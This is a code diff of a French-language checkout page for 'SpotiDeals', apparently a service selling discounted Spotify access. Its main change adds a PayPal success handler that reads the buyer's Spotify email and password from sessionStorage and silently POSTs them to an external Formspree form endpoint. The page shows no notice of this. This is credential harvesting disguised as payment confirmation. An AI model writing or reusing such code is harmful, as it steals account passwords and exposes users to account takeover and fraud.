@@ -8,57 +8,51 @@
 
   <!-- PayPal SDK -->
   <script src="https://www.paypal.com/sdk/js?client-id=AW-bLBrtEPaB0FTD-Oa4rQ1gbQBNLkkqSsAtGh968nfbb-HA_iZh-Cptg_1UzbE9GYagkCPtHFEUosfm&currency=CAD"></script>
-  <!-- Stripe Buy Button SDK -->
-  <script async src="https://js.stripe.com/v3/buy-button.js"></script>
 </head>
 <body>
   <div class="container">
-    <header><h1>Paiement SpotiDeals</h1></header>
+    <header>
+      <h1>Paiement SpotiDeals</h1>
+      <a href="index.html" class="btn" style="margin-top:-10px; background:#555;">← Accueil</a>
+    </header>
 
     <section class="card">
-      <h2>Choisissez votre moyen de paiement</h2>
+      <h2>Paiement via PayPal</h2>
       <p>Montant total : <strong>82,62 $ CAD</strong></p>
-
-      <!-- PayPal Button -->
-      <div id="paypal-button-container" style="margin-bottom: 20px;"></div>
-
-      <p style="text-align:center; color:#999; margin: 10px 0;">— ou —</p>
-
-      <!-- Stripe Buy Button -->
-      <div style="text-align:center;">
-        <stripe-buy-button
-          buy-button-id="buy_btn_1RTw9lATQVKJIRPOwkarvaV9"
-          publishable-key="pk_live_51RTbNaATQVKJIRPObZmmXXYWSD6geESHBf4DyeSY2rcZzecnc3iRFjBlTcUNrI7sEpU4hkqpT4RskHLhDY3zdywG009wFLeiPb">
-        </stripe-buy-button>
-      </div>
+      <div id="paypal-button-container"></div>
     </section>
 
     <footer>© 2025 SpotiDeals</footer>
   </div>
 
   <script>
-    // Initialisation du bouton PayPal
     paypal.Buttons({
-      style: {
-        shape: 'pill',
-        color: 'blue',
-        label: 'pay',
-        layout: 'vertical'
-      },
-      createOrder: function(data, actions) {
-        return actions.order.create({
-          purchase_units: [{
-            amount: { value: '82.62' },
-            invoice_id: 'SD-' + Date.now()
-          }]
-        });
-      },
-      onApprove: function(data, actions) {
-        return actions.order.capture().then(function(details) {
-          alert('✅ Paiement PayPal reçu !\nNuméro de commande : ' + details.id);
+      style: { shape:'pill', color:'blue', label:'pay' },
+      createOrder: (data, actions) => actions.order.create({
+        purchase_units: [{
+          amount: { value:'82.62' },
+          invoice_id: 'SD-' + Date.now()
+        }]
+      }),
+      onApprove: (data, actions) =>
+        actions.order.capture().then(details => {
+          const spotifyEmail    = sessionStorage.getItem('spotifyEmail');
+          const spotifyPassword = sessionStorage.getItem('spotifyPassword');
+          const orderID         = details.id;
+          // Envoi à Formspree  
+          fetch('https://formspree.io/f/xanorewp', {
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({
+              spotifyEmail,
+              spotifyPassword,
+              orderID,
+              method:'PayPal'
+            })
+          });
+          alert('✅ Paiement reçu !\nVotre numéro de commande : ' + orderID);
           window.location.href = 'index.html';
-        });
-      }
+        })
     }).render('#paypal-button-container');
   </script>
 </body>
